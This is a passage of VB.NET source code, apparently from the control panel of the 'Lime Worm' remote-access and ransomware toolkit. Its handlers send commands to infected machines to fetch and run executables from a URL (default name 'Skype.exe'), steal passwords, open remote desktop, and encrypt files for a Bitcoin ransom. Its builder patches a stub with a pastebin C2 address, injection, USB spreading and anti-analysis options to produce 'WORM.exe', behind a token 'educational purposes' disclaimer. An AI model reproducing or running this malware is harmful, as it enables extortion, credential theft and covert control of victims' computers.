        If m_SortingColumn Is Nothing Then
            ' New column. Sort ascending.
            sort_order = SortOrder.Ascending
        Else
            ' See if this is the same column.
            If new_sorting_column.Equals(m_SortingColumn) Then
                ' Same column. Switch the sort order.
                If m_SortingColumn.Text.StartsWith("> ") Then
                    sort_order = SortOrder.Descending
                Else
                    sort_order = SortOrder.Ascending
                End If
            Else
                ' New column. Sort ascending.
                sort_order = SortOrder.Ascending
            End If

            ' Remove the old sort indicator.
            m_SortingColumn.Text =
                m_SortingColumn.Text.Substring(2)
        End If

        ' Display the new sort order.
        m_SortingColumn = new_sorting_column
        If sort_order = SortOrder.Ascending Then
            m_SortingColumn.Text = "> " & m_SortingColumn.Text
        Else
            m_SortingColumn.Text = "< " & m_SortingColumn.Text
        End If

        ' Create a comparer.
        L1.ListViewItemSorter = New ListViewComparer(e.Column, sort_order)

        ' Sort.
        L1.Sort()
        Fix()

    End Sub

    Public Class MyRenderer
        Inherits ToolStripProfessionalRenderer
        Protected Overloads Overrides Sub OnRenderMenuItemBackground(ByVal e As ToolStripItemRenderEventArgs)
            Dim rc As New Rectangle(Point.Empty, e.Item.Size)
            Dim c As Color = IIf(e.Item.Selected, Color.DarkGreen, Color.Black)
            Using brush As New SolidBrush(c)
                e.Graphics.FillRectangle(brush, rc)
            End Using
        End Sub
    End Class

    Private Sub ToolStripStatusLabel2_Click(sender As Object, e As EventArgs) Handles ToolStripStatusLabel2.Click
        If ToolStripStatusLabel2.Text = ("       NOTIFICATION [ON]") Then
            ToolStripStatusLabel2.Text = "       NOTIFICATION [OFF]"
            ToolStripStatusLabel2.ForeColor = Color.Red
        Else
            ToolStripStatusLabel2.Text = "       NOTIFICATION [ON]"
            ToolStripStatusLabel2.ForeColor = Color.Lime
        End If
        My.Settings.Noti = ToolStripStatusLabel2.Text
        My.Settings.Save()
    End Sub

#End Region


#Region "Commands"

    Private Sub DiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DiskToolStripMenuItem.Click
        Try
            Dim o As New OpenFileDialog
            With o
                .Filter = ".exe (*.exe)|*.exe"
                .Title = "UPDATE"
            End With

            If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                For Each x As ListViewItem In L1.SelectedItems
                    S.Send(x.Tag, "RunDisk" & SPL & o.FileName & SPL & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)) & SPL & "update")
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub FromURLToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromURLToolStripMenuItem.Click
        Dim URL As String = InputBox("Enter the direct link", "UPDATE", "http://site.com/file.exe")
        Dim EXE As String = InputBox("Enter the file name", "File Name", "Skype.exe")

        If String.IsNullOrEmpty(URL) Then
            Exit Sub
        Else
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, "RunURL" & SPL & URL & SPL & EXE & SPL & "update")
            Next
        End If
    End Sub

    Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "Reconnect")
        Next
    End Sub

    Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "Close")
        Next
    End Sub

    Private Sub UninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UninstallToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "Uninstall")
        Next
    End Sub

    '===================

    Private Sub RemoteDesktopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\RDP.dll")))
        Next
    End Sub

    Public Shared RANS_IMG
    Public Shared RANS_TEXT
    Private Sub EncryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EncryptToolStripMenuItem.Click
        Dim R As New Ransomware
        R.ShowDialog()

        If R.OK = True Then
            RANS_IMG = Convert.ToBase64String(IO.File.ReadAllBytes(R.PictureBox1.ImageLocation))
            RANS_TEXT = R.RichTextBox1.Text
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\ENC.dll")))
            Next
        End If
    End Sub

    Private Sub DecryptionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DecryptionToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\DEC.dll")))
            Next
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub CheckFilesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CheckFilesToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\FM.dll")))
        Next
    End Sub

    Private Sub DetailsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DetailsToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\DET.dll")))
        Next
    End Sub

    Private Sub PasswordsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PasswordsToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Plugin\PWD.dll")))
        Next
    End Sub

    Private Sub FromURLToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FromURLToolStripMenuItem1.Click
        Dim URL As String = InputBox("Enter the direct link", "Run File", "http://site.com/file.exe")
        Dim EXE As String = InputBox("Enter the file name", "File Name", "Skype.exe")

        If String.IsNullOrEmpty(URL) Then
            Exit Sub
        Else
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, "RunURL" & SPL & URL & SPL & EXE)
            Next
        End If
    End Sub

    Private Sub FromDiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromDiskToolStripMenuItem.Click
        Try
            Dim o As New OpenFileDialog
            With o
                .Title = "RUN"
            End With

            If o.ShowDialog = Windows.Forms.DialogResult.OK Then

                For Each x As ListViewItem In L1.SelectedItems
                    S.Send(x.Tag, "RunDisk" & SPL & o.FileName & SPL & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem.Click
        About.Show()
    End Sub

    Private Sub BotColorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BotColorToolStripMenuItem.Click
        Dim cDialog As New ColorDialog

        If (cDialog.ShowDialog() = DialogResult.OK) Then
            For Each x As ListViewItem In L1.SelectedItems
                x.ForeColor = cDialog.Color
                Dim CCC = ColorTranslator.ToHtml(cDialog.Color)
                My.Computer.Registry.CurrentUser.CreateSubKey("Software\Lime")
                My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Lime", x.SubItems(2).Text + "_" + x.SubItems(3).Text, CCC)
            Next
        End If
    End Sub

    Private Sub PCRestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCRestartToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "PC-RES")
        Next
    End Sub

    Private Sub PCShutdownToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCShutdownToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "PC-SHUT")
        Next
    End Sub

    Private Sub PCLogoutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCLogoutToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "PC-OUT")
        Next
    End Sub




#End Region


#Region "Builder"

    Private Sub ChButton1_Click(sender As Object, e As EventArgs) Handles ChButton1.Click

        Dim result As DialogResult
        result = MessageBox.Show("I, the creator, am not responsible for any actions, and or damages, caused by this software. " & vbNewLine & vbNewLine & "You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only." & vbNewLine & vbNewLine & "This software's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use." & vbNewLine & vbNewLine & "By pressing ""YES"" button, you automatically agree to the above.", "Lime Worm | Disclaimer" & vbNewLine & vbNewLine, MessageBoxButtons.YesNo)
        If result = DialogResult.No Then
            Return
        ElseIf result = DialogResult.Yes Then

            If (EXE.Text = "") Then
                EXE.Text = "Wservices.exe"
            End If

            If PATH1.Text = "" Then
                PATH1.Text = "Temp"
            End If

            If Not EXE.Text.EndsWith(".exe") Then
                EXE.Text = EXE.Text + ".exe"
            End If

            If PATH2.Text = "" Then
                PATH2.Text = String.Empty
            End If

            If Not PATH2.Text.StartsWith("\") AndAlso Not PATH2.Text = String.Empty Then
                PATH2.Text = "\" + PATH2.Text
            End If

            If Not IO.File.Exists((Application.StartupPath & "\Stub\stub.exe")) Then
                MsgBox("Stub Not Found", MsgBoxStyle.Critical, Nothing)
                Return
            ElseIf Pastebin.Text = "" Or Not Pastebin.Text.Contains("http") Then
                MsgBox("Enter pastebin raw url", MsgBoxStyle.Critical, Nothing)
                Return
            Else
                Try
                    Dim definition As AssemblyDefinition = AssemblyDefinition.ReadAssembly((Application.StartupPath & "\Stub\stub.exe"))
                    Dim definition2 As ModuleDefinition
                    For Each definition2 In definition.Modules
                        Dim definition3 As TypeDefinition
                        For Each definition3 In definition2.Types
                            Dim definition4 As MethodDefinition
                            For Each definition4 In definition3.Methods
                                If (definition4.IsConstructor AndAlso definition4.HasBody) Then
                                    Dim enumerator As IEnumerator(Of Instruction)
                                    Try
                                        enumerator = definition4.Body.Instructions.GetEnumerator
                                        Do While enumerator.MoveNext
                                            Dim current As Instruction = enumerator.Current
                                            If ((current.OpCode.Code = Code.Ldstr) And (Not current.Operand Is Nothing)) Then
                                                Dim str As String = current.Operand.ToString
                                                If (str = "%Pastebin%") Then
                                                    current.Operand = Pastebin.Text
                                                End If
                                                If (str = "%EXE%") Then
                                                    current.Operand = EXE.Text
                                                End If
                                                If (str = "%SPL%") Then
                                                    current.Operand = SPL.ToString
                                                End If
                                                If (str = "%KEY%") Then
                                                    current.Operand = BS(Convert.FromBase64String(S_Socket.KEY.ToString))
                                                End If
                                                If (str = "%PASS%") Then
                                                    current.Operand = MYPASS.ToString
                                                End If
                                                If (str = "%DROP%") Then
                                                        current.Operand = DROP.Checked.ToString
                                                    End If
                                                If (str = "%PATH1%") Then
                                                    current.Operand = PATH1.Text
                                                End If
                                                If (str = "%PATH2%") Then
                                                    current.Operand = PATH2.Text
                                                End If
                                                If (str = "%INJ_NAME%") Then
                                                    current.Operand = Injection_Name.Text
                                                End If
                                                If (str = "%INJ_CHK%") Then
                                                    current.Operand = Injection_CHK.Checked.ToString
                                                End If
                                                If (str = "%BTC_ADDR%") Then
                                                    current.Operand = BTC_ADDR.Text
                                                End If
                                                If (str = "%USB%") Then
                                                    current.Operand = USB_CHK.Checked.ToString
                                                End If
                                                If (str = "%PIN%") Then
                                                    current.Operand = PIN_CHK.Checked.ToString
                                                End If
                                                If (str = "%ANTI%") Then
                                                    current.Operand = ANTI.Checked.ToString
                                                End If
                                            End If
                                        Loop
                                    Finally
                                    End Try

                                End If
                            Next
                        Next
                    Next

                    definition.Write(Application.StartupPath + "\" + "WORM.exe")
                    If Icon_OFF.Checked = True AndAlso Icon_Box.ImageLocation <> "" Then
                        S_Iconchanger.InjectIcon(Application.StartupPath + "\" + "WORM.exe", Icon_Box.ImageLocation)
                    End If
                    MsgBox("Your Worm Has been Created Successfully", vbInformation, "DONE!")
                    My.Settings.Save()
                Catch ex1 As Exception
                    MsgBox(ex1.Message, MsgBoxStyle.Exclamation)
                    Return
                End Try
            End If
        End If
    End Sub

    Private Sub DROP_CheckedChanged(sender As Object) Handles DROP.CheckedChanged
        If DROP.Checked = True Then
            EXE.Enabled = True
            PATH1.Enabled = True
            PATH2.Enabled = True
            Injection_CHK.Enabled = True
            USB_CHK.Checked = False
            PIN_CHK.Checked = False
            USB_CHK.Enabled = False
            PIN_CHK.Enabled = False
        Else
            EXE.Enabled = False
            PATH1.Enabled = False
            PATH2.Enabled = False
            Injection_CHK.Enabled = False
            Injection_CHK.Checked = False
            USB_CHK.Enabled = True
            PIN_CHK.Enabled = True
        End If
    End Sub

    Private Sub ChButton2_Click(sender As Object, e As EventArgs) Handles ChButton2.Click
        BackgroundWorker2.RunWorkerAsync()
    End Sub

    Private Sub BackgroundWorker2_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker2.DoWork
        Try
            Dim x As String
            Dim wc As New Net.WebClient
            Dim rx As New Text.RegularExpressions.Regex("^(?:(?:25[0-5]|2[0-4]\d|[01]\d\d|\d?\d)(?(?=\.?\d)\.)){4}$")
            x = wc.DownloadString(Pastebin.Text)

            If rx.IsMatch(x.Split(":")(0)) AndAlso x.Split(":")(1) <= 65535 Then
                MsgBox("Valid! " + x, MsgBoxStyle.Information)
            Else
                MsgBox("Wrong format", MsgBoxStyle.Critical)
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub Icon_OFF_CheckedChanged(sender As Object) Handles Icon_OFF.CheckedChanged
        If Icon_OFF.Checked = True Then
            Dim o As New OpenFileDialog
            With o
                .Filter = "*.ico (*.ico)| *.ico"
                .InitialDirectory = Application.StartupPath + "\Icons"
                .Title = "Select Icon"
            End With

            If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                Icon_Box.ImageLocation = o.FileName
            Else
                Icon_OFF.Checked = False
            End If
        End If
    End Sub


#End Region


End Class


